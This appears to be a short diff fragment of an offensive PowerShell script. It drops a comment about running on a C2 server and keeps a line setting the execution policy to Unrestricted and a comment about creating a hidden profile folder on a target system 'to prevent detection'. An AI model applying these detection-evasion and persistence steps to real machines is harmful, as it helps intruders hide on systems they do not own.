@@ -1,5 +1,3 @@
-#NOTE: EVERYTHING below MUST be ran on your C2 SERVER via a POWERSHELL LAUNCHER
-
 Set-ExecutionPolicy Unrestricted
 
 # Create PowerShell profile directory as a hidden folder to prevent detection. RUN ON THE TARGET SYSTEM AND NOT THE C2
